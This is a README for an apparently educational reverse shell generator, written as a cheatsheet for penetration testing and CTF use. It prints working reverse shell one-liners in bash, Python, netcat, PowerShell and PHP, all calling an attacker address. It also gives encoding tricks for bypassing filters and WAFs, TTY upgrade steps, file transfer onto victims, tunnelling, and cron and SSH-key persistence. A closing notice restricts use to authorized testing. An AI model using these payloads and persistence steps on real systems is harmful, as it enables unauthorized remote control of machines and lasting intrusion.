# 🐚 Reverse Shell Generator

<div align="center">

![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg)
![License](https://img.shields.io/badge/license-Educational-green.svg)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)
![Version](https://img.shields.io/badge/version-2.0-orange.svg)
![Status](https://img.shields.io/badge/status-Production%20Ready-brightgreen.svg)

**A comprehensive, user-friendly reverse shell payload generator supporting 20+ languages and platforms**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Shell Types](#-supported-shell-types) • [Examples](#-examples) • [📄 Cheatsheet](CHEATSHEET.md)

</div>

---

## ✨ Features

<table>
<tr>
<td>

### 🎯 Interactive Mode
- Menu-driven interface
- Easy shell selection
- Post-generation options
- IP/Port validation

</td>
<td>

### 📋 Clipboard Integration
- One-click copy
- Cross-platform support
- Instant paste on target

</td>
</tr>
<tr>
<td>

### 🔐 Multiple Encodings
- URL encoding
- Base64 encoding
- Hex encoding
- Double URL encoding

</td>
<td>

### 💾 File Export
- Save individual payloads
- Export all shells
- Formatted output

</td>
</tr>
<tr>
<td>

### 📚 Categorized Shells
- Linux Shells (8 types)
- Scripting Languages (7 types)
- Windows (3 types)
- Compiled Languages (2 types)

</td>
<td>

### 🎨 Enhanced UX
- Color-coded output
- Detailed descriptions
- Input validation
- Helpful error messages

</td>
</tr>
</table>

---

## 🚀 Installation

### Requirements
- Python 3.6 or higher
- No external dependencies required

### Quick Start

```bash
# Clone or download the script
cd revshell_gen

# Run interactive mode
python revshell.py

# Or use command-line mode
python revshell.py <IP> <PORT> <SHELL_TYPE>
```

### Optional: Clipboard Support

For clipboard functionality, ensure you have:
- **Windows**: Built-in (`clip`)
- **macOS**: Built-in (`pbcopy`)
- **Linux**: Install `xclip` or `xsel`
  ```bash
  sudo apt install xclip  # Debian/Ubuntu
  sudo yum install xclip  # RHEL/CentOS
  ```

---

## 📖 Usage

### Interactive Mode (Recommended)

Simply run without arguments to launch the interactive menu:

```bash
python revshell.py
```

**Interactive Features:**
1. **Generate Specific Shell** - Browse and select from 21+ shells
2. **List All Shells** - View all available shells with descriptions
3. **List by Category** - Browse shells organized by platform
4. **Generate All Shells** - Create all shells at once
5. **Change IP/Port** - Update configuration without restarting
6. **Exit** - Clean exit

**Post-Generation Options:**
- `c` - Copy to clipboard
- `e` - Encode payload (URL, Base64, Hex, Double URL)
- `s` - Save to file
- `l` - Show listener command
- `Enter` - Return to menu

### Command-Line Mode

#### Basic Syntax
```bash
python revshell.py <IP> <PORT> <SHELL_TYPE> [OPTIONS]
```

#### Command-Line Options

| Option | Short | Description |
|--------|-------|-------------|
| `--interactive` | `-i` | Launch interactive mode |
| `--list` | | List all available shell types with descriptions |
| `--list-categories` | | List shells organized by category |
| `--all` | | Generate all available shells |
| `--encode <type>` | | Encode payload (url, base64, hex, double_url) |
| `--clipboard` | `-c` | Copy payload to clipboard |
| `--save <file>` | | Save payload to file |

---

## 💡 Examples

### Quick Start Examples

```bash
# Interactive mode - easiest for beginners
python revshell.py

# Generate a bash reverse shell
python revshell.py 10.10.10.5 4444 bash

# Generate Python3 shell and copy to clipboard
python revshell.py 10.10.10.5 4444 python3 -c

# Generate with URL encoding for web shells
python revshell.py 10.10.10.5 4444 php --encode url

# Save to file
python revshell.py 10.10.10.5 4444 bash --save payload.txt

# List all available shells
python revshell.py 10.10.10.5 4444 --list

# List shells by category
python revshell.py 10.10.10.5 4444 --list-categories

# Generate all shells
python revshell.py 10.10.10.5 4444 --all
```

### Advanced Examples

```bash
# Combine multiple options
python revshell.py 10.10.10.5 4444 bash --encode url --clipboard --save encoded.txt

# Generate base64 encoded PowerShell
python revshell.py 192.168.1.100 9001 powershell --encode base64

# Quick copy for CTFs
python revshell.py 10.10.14.5 4444 python3 -c
# Now just paste on target!
```

### Workflow Example

**Scenario: Pentesting a Linux target**

```bash
# 1. Start your listener
nc -lvnp 4444

# 2. Generate payload and copy to clipboard
python revshell.py 10.10.14.5 4444 python3 -c

# 3. Paste and execute on target
# The payload is already in your clipboard!
```

---

## 🛠️ Supported Shell Types

### Linux Shells

| Shell | Description |
|-------|-------------|
| `bash` | Standard bash reverse shell using /dev/tcp |
| `bash_tcp` | Alternative bash TCP reverse shell |
| `bash_udp` | Bash UDP reverse shell |
| `nc` | Traditional netcat with -e flag |
| `nc_openbsd` | Netcat for OpenBSD (no -e flag) |
| `socat` | Socat reverse shell (very stable) |
| `telnet` | Telnet-based reverse shell |
| `awk` | AWK-based reverse shell |

### Scripting Languages

| Shell | Description |
|-------|-------------|
| `python` | Python 2 reverse shell |
| `python3` | Python 3 reverse shell with PTY |
| `perl` | Perl socket-based reverse shell |
| `php` | PHP reverse shell using fsockopen |
| `ruby` | Ruby TCP socket reverse shell |
| `lua` | Lua socket reverse shell |
| `nodejs` | Node.js net module reverse shell |

### Windows

| Shell | Description |
|-------|-------------|
| `powershell` | PowerShell TCP client reverse shell |
| `powershell_base64` | PowerShell base64 encoded payload |
| `powershell_encoded` | PowerShell with full encoding |

### Compiled Languages

| Shell | Description |
|-------|-------------|
| `java` | Java Runtime.exec reverse shell |
| `golang` | Golang reverse shell (requires compilation) |

### Other

| Shell | Description |
|-------|-------------|
| `xterm` | X11 xterm reverse shell |

---

## 🔐 Encoding Options

### URL Encoding
Perfect for web shells and URL parameters:
```bash
python revshell.py 10.10.10.5 4444 bash --encode url
# Output: bash%20-i%20%3E%26%20/dev/tcp/10.10.10.5/4444%200%3E%261
```

**Use Cases:**
- Injecting into web parameters
- Bypassing basic input filters
- Web shell payloads

### Base64 Encoding
Useful for bypassing filters:
```bash
python revshell.py 10.10.10.5 4444 bash --encode base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQ==
```

**Use Cases:**
- Bypassing character filters
- Obfuscating payloads
- Command injection

### Hex Encoding
For binary-safe transmission:
```bash
python revshell.py 10.10.10.5 4444 bash --encode hex
# Output: \x62\x61\x73\x68\x20\x2d\x69...
```

**Use Cases:**
- Binary protocols
- Shellcode integration
- Low-level exploitation

### Double URL Encoding
For double-encoded scenarios:
```bash
python revshell.py 10.10.10.5 4444 bash --encode double_url
```

**Use Cases:**
- WAF bypass
- Double-decoding vulnerabilities
- Complex web applications

---

## 🎧 Setting Up a Listener

Before executing the reverse shell on the target, set up a listener on your machine:

### Using Netcat (Most Common)
```bash
nc -lvnp 4444
```

### Using Socat (More Stable)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Using Metasploit
```bash
msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST <YOUR_IP>; set LPORT 4444; exploit"
```

### Using Pwncat (Modern Alternative)
```bash
pwncat-cs -l 4444
```

---

## ⬆️ Upgrading Your Shell

Once you get a basic shell, upgrade it to a fully interactive TTY:

### Method 1: Python PTY (Recommended)
```bash
# On victim machine
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background the shell

# On your machine
stty raw -echo; fg

# Press Enter twice

# On victim machine
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116  # Adjust to your terminal size
```

### Method 2: Script Command
```bash
script /dev/null -c bash
```

### Method 3: Socat
```bash
# On your machine (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.5:4444
```

### Method 4: Expect
```bash
expect -c 'spawn /bin/bash; interact'
```

---

## 📚 Reverse Shell Cheatsheet

> [!NOTE]
> **📄 Comprehensive Cheatsheet Available!**
> 
> For a complete, standalone reference guide, check out **[CHEATSHEET.md](CHEATSHEET.md)**
> 
> The cheatsheet includes:
> - Most common reverse shells with examples
> - Shell upgrade techniques (Python PTY, socat, etc.)
> - Bypassing restrictions (encoding, obfuscation)
> - File transfer methods after getting a shell
> - Port forwarding with SSH and Chisel
> - Persistence techniques (cron, SSH keys, systemd)
> - Troubleshooting tips and tricks
> 
> Perfect for quick reference during engagements!

### Quick Reference (Most Common Shells)


#### Bash
```bash
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
```

#### Python3 (with PTY)
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

#### Netcat (Traditional)
```bash
nc -e /bin/sh 10.10.10.5 4444
```

#### Netcat (OpenBSD - no -e)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.5 4444 >/tmp/f
```

#### PowerShell (One-liner)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("10.10.10.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### PHP
```php
php -r '$sock=fsockopen("10.10.10.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bypassing Restrictions

#### Base64 Encoding (Bash)
```bash
echo "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" | base64
# Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQo=

# Execute
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC41LzQ0NDQgMD4mMQo= | base64 -d | bash
```

#### URL Encoding
```bash
# Encode special characters for web shells
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.5%2F4444%200%3E%261%27
```

### File Transfer After Shell

#### Python HTTP Server (Your machine)
```bash
python3 -m http.server 8000
```

#### Download on Victim
```bash
# wget
wget http://10.10.10.5:8000/file

# curl
curl http://10.10.10.5:8000/file -o file

# Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.10.5:8000/file", "file")'
```

### Port Forwarding

#### SSH Local Port Forward
```bash
ssh -L 8080:localhost:80 user@target
```

#### SSH Remote Port Forward
```bash
ssh -R 8080:localhost:80 user@attacker
```

#### Chisel (Tunneling)
```bash
# On your machine (server)
./chisel server -p 8000 --reverse

# On victim (client)
./chisel client 10.10.10.5:8000 R:4444:localhost:4444
```

### Persistence

#### Cron Job
```bash
(crontab -l ; echo "@reboot sleep 200 && bash -i >& /dev/tcp/10.10.10.5/4444 0>&1")|crontab -
```

#### SSH Key
```bash
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

## 🎯 Shell Selection Guide

### For Linux Targets
- **bash** - Most reliable, works on almost all Linux systems
- **python3** - Great for getting a proper TTY
- **nc** - Classic, but requires netcat with -e flag
- **socat** - Most stable option if available

### For Windows Targets
- **powershell** - Standard PowerShell reverse shell
- **powershell_base64** - Encoded version, harder to detect
- **powershell_encoded** - For download cradle attacks

### For Web Applications
- **php** - Perfect for PHP web shells
- **nodejs** - For Node.js applications
- **python** - Many web apps have Python available
- **ruby** - Ruby on Rails applications

### For Restricted Environments
Try these if standard shells don't work:
- **bash_tcp** - Alternative bash syntax
- **perl** - Often available when bash isn't
- **ruby** - Another good alternative
- **awk** - Surprisingly often available

---

## 💡 Pro Tips

### 1. Use Interactive Mode for Exploration
When you're not sure which shell to use:
```bash
python revshell.py
# Then select option 3 to browse by category
```

### 2. Combine Multiple Options
```bash
python revshell.py 10.10.10.5 4444 bash --encode url --save payload.txt --clipboard
```
This will:
- Generate a bash shell
- URL encode it
- Save to file
- Copy to clipboard

### 3. Quick Reference
```bash
python revshell.py 10.10.10.5 4444 --list-categories
```
Shows all shells organized by platform.

### 4. Always Validate
The tool automatically validates:
- IP address format (IPv4)
- Port range (1-65535)

### 5. Use Clipboard for Speed
```bash
python revshell.py 10.10.10.5 4444 python3 -c
# Instantly ready to paste!
```

### 6. Save All for Offline Reference
```bash
python revshell.py 10.10.10.5 4444 --all > all_shells.txt
```

---

## 🛠️ Troubleshooting

### "Invalid IP address format"
- Ensure you're using a valid IPv4 address (e.g., 192.168.1.100)
- Check for typos in the IP address

### "Invalid port"
- Port must be between 1 and 65535
- Common ports: 4444, 9001, 1337, 8080

### Clipboard not working?
The tool uses platform-specific clipboard commands:
- **Windows**: `clip` (built-in)
- **macOS**: `pbcopy` (built-in)
- **Linux**: `xclip` or `xsel` (install if needed)

```bash
# Install on Linux
sudo apt install xclip  # Debian/Ubuntu
sudo yum install xclip  # RHEL/CentOS
```

### Shell dies immediately?
- Check firewall rules on both machines
- Verify IP and port are correct
- Try different shell types
- Use socat for more stable connection

### No interactive shell?
- Upgrade using Python PTY method
- Check if Python is available on target
- Try script command
- Use expect if available

---

## 🔒 Security Notice

> [!CAUTION]
> **This tool is for educational purposes and authorized penetration testing only.**

### Legal Requirements

✅ **You MUST have:**
- Written authorization from system owner
- Proper scope definition
- Legal permission to test

❌ **Never use on:**
- Systems you don't own
- Systems without explicit permission
- Production systems without authorization

### Responsible Use

- Always follow responsible disclosure practices
- Document all activities during authorized testing
- Clean up after testing (remove persistence, etc.)
- Use encrypted channels in production environments
- Respect privacy and data protection laws

### Disclaimer

The author is not responsible for misuse of this tool. Unauthorized access to computer systems is illegal and punishable by law. This tool is provided for educational purposes only.

---

## 📦 Requirements

- **Python**: 3.6 or higher
- **Dependencies**: None (pure Python)
- **Platform**: Windows, macOS, Linux
- **Optional**: `xclip` or `xsel` for Linux clipboard support

---

## 🆕 What's New in v2.0

### Major Features
- ✨ Interactive menu-driven mode
- 📋 Clipboard integration (cross-platform)
- 🔐 Multiple encoding options (URL, Base64, Hex, Double URL)
- 💾 Save to file functionality
- 📚 Categorized shell organization
- ✅ IP and port validation
- 📝 Detailed shell descriptions
- 🎨 Enhanced UI with better colors
- 🚀 Improved command-line interface

### Technical Improvements
- Type hints for better code clarity
- Validation methods for IP and port
- Helper functions for encoding and clipboard
- Better error handling
- Organized code structure
- Comprehensive documentation

---

## 📊 Statistics

- **21** shell types supported
- **4** encoding options available
- **5** categories for organization
- **~450** lines of well-structured code
- **100%** Python - No dependencies
- **3** platforms supported (Windows/macOS/Linux)

---

## 🎓 Educational Resources

### Learning Path
1. Start with **bash** shells to understand basics
2. Learn **Python PTY** for shell upgrades
3. Explore **encoding** for filter bypass
4. Study **persistence** techniques
5. Practice in **CTF** environments

### Recommended Resources
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [PentestMonkey - Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)

---

## 🤝 Contributing

This is an educational tool. Feel free to:
- Report bugs or issues
- Suggest new shell types
- Improve documentation
- Share your use cases

---

## 📄 License

**Educational Use Only**

This tool is provided for educational purposes and authorized security testing. Use responsibly and ethically.

---

## 🙏 Acknowledgments

- Inspired by various reverse shell cheatsheets
- Built for the cybersecurity community
- Designed for both learning and professional use

---

<div align="center">

**Made with ❤️ for the cybersecurity community**

![GitHub](https://img.shields.io/badge/GitHub-cybershit-blue?logo=github)
![Python](https://img.shields.io/badge/Made%20with-Python-yellow?logo=python)

**[⬆ Back to Top](#-reverse-shell-generator)**

</div>
